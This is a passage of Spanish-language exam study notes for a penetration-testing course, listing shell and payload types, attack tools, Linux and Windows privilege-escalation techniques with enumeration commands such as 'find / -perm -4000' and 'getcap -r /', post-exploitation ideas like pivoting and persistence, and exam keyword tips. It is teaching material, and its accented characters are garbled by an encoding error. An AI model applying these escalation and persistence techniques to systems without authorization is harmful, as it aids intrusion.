- **Bind** = Atacante ‚Üí V√≠ctima

### üìå PAYLOADS:
- **Staged** = M√∫ltiples etapas
- **Non-Staged** = Una sola vez

### üìå HERRAMIENTAS:
- **Metasploit** = Framework de exploits (Ruby)
- **BurpSuite** = Auditor√≠a web
- **SQLMap** = SQL Injection
- **msfvenom** = Generar payloads

### üìå ESCALACI√ìN LINUX (t√©cnicas):
1. **SUID** ‚Üí `find / -perm -4000`
2. **sudoers** ‚Üí `sudo -l`
3. **Cron jobs** ‚Üí PsPy
4. **Kernel** ‚Üí DirtyCOW
5. **Capabilities** ‚Üí `getcap -r /`
6. **Path Hijacking**
7. **Writable files**

### üìå ESCALACI√ìN WINDOWS:
- UAC Bypass
- Kernel exploits
- Windows Exploit Suggester
- PowerUp.ps1

### üìå POST-EXPLOTACI√ìN:
- Enumeraci√≥n local
- Escalaci√≥n privilegios
- **Pivoting** = Acceso a otras redes
- **Persistencia** = Mantener acceso

### üìå REPORTE:
- **T√©cnico** = Alto detalle (para t√©cnicos)
- **Ejecutivo** = Simple (para direcci√≥n)

### üìå PUERTOS COMUNES:
21=FTP | 22=SSH | 80=HTTP | 443=HTTPS | 445=SMB | 3306=MySQL | 3389=RDP

### üìå RECURSOS:
- gtfobins.github.io (SUID, sudo)
- exploit-db.com (Google Dorks)

---

## üî• ESTRATEGIA PARA EL EXAMEN

### ‚úÖ Palabras clave en preguntas:

**Si ves:** "sin tocar objetivo" / "fuentes p√∫blicas" ‚Üí **Passive Info Gathering**
**Si ves:** "escanear puertos" / "interactuar" ‚Üí **Active Info Gathering**
**Si ves:** "sigiloso" / "stealth" ‚Üí **-sS** (nmap)
**Si ves:** "todos los puertos" ‚Üí **-p-**
**Si ves:** "detectar versi√≥n" ‚Üí **-sV**
**Si ves:** "evade firewall" ‚Üí **Reverse Shell**
**Si ves:** "m√∫ltiples etapas" ‚Üí **Staged payload**
**Si ves:** "Ruby" ‚Üí **Metasploit**
**Si ves:** "aplicaciones web" ‚Üí **BurpSuite**
**Si ves:** "SQL Injection" ‚Üí **SQLMap**
**Si ves:** "ejecutar como propietario" ‚Üí **SUID**
**Si ves:** "sudo -l" ‚Üí **sudoers**
**Si ves:** "tareas programadas" ‚Üí **Cron jobs**
**Si ves:** "dispositivos conectados Internet" ‚Üí **Shodan**
**Si ves:** "b√∫squeda avanzada Google" ‚Üí **Google Dorks**
**Si ves:** "puente a otras redes" ‚Üí **Pivoting**
**Si ves:** "mantener acceso" ‚Üí **Persistencia**
**Si ves:** "alta direcci√≥n" / "simple" ‚Üí **Informe Ejecutivo**
**Si ves:** "detalle t√©cnico" ‚Üí **Informe T√©cnico**
**Si ves:** "puerto 445" ‚Üí **SMB**
**Si ves:** "puerto 3389" ‚Üí **RDP**

---

## üí™ ¬°√âxito en tu examen!

**Recuerda:** Esta unidad es **muy pr√°ctica** y se centra en:
1. **Etapas del pentest** (5 etapas)
2. **Diferencia Passive vs Active**
3. **Nmap** y sus par√°metros clave
4. **Shells** (Reverse vs Bind)
5. **Escalaci√≥n de privilegios** (SUID, sudoers, cron)
6. **Herramientas** (Metasploit, BurpSuite, SQLMap)
7. **Reporte** (T√©cnico vs Ejecutivo)

**Lo m√°s importante:**
- Las **5 etapas** (IREPR)
- **Nmap par√°metros** (-sS, -sV, -p-, -sC)
- **SUID y sudoers** en Linux
- **Reverse Shell** evade firewall
- **Diferencia entre informes**

**Practica las preguntas tipo examen y estar√°s listo.** üöÄ

